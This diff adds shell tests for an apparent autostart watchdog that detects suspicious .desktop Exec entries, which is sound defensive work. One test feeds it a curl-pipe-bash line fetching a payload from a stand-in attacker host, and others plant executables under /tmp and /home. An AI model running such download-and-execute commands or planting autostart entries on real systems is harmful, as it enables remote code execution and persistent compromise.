@@ -224,3 +224,54 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-xdg-autostart -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no-auto-trust: xdg-autostart-watchdog does NOT refresh baseline on suspicious-Exec detection — alert STAYS until operator updates)" {
+    # Login/session persistence primitive — alert MUST persist
+    # across runs until operator explicitly re-baselines. Sister to
+    # sshd-config, sudo-conf, gss-mech, ld-preload, nm-vpn-plugin,
+    # openvpn-config — active-injection class never auto-trusts.
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop /tmp/.x > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: a second autostart dir ALSO scanned — both /etc/xdg/autostart + ~/.config/autostart)" {
+    # xdg-autostart consults BOTH /etc/xdg/autostart (system) and
+    # ~/.config/autostart (per-user). Both may carry attacker-planted
+    # .desktop files — watchdog must enumerate every dir in
+    # SELFDEF_XDG_DIRS.
+    AUTOD2="${TMP}/autostart.user"; mkdir -p "${AUTOD2}"
+    desktop /usr/bin/nm-applet > "${DESK}"
+    DIRS="${AUTOD} ${AUTOD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    desktop /tmp/user-evil > "${AUTOD2}/user-app.desktop"
+    DIRS="${AUTOD} ${AUTOD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant in Exec — sister to wget-pipe-sh axis)" {
+    # Attacker may swap wget→curl and sh→bash. Both downloader-
+    # tool and shell variants must trigger.
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop 'bash -c "curl -fsSL http://attacker/p | bash"' > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (Exec under /home: user-writable hijack coverage)" {
+    # Operator's home dir is a writable-root variant. Symmetric to
+    # /tmp + /var/tmp + /dev/shm axes already locked.
+    desktop /usr/bin/nm-applet > "${DESK}"
+    run_wd
+    desktop /home/user/evil > "${DESK}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
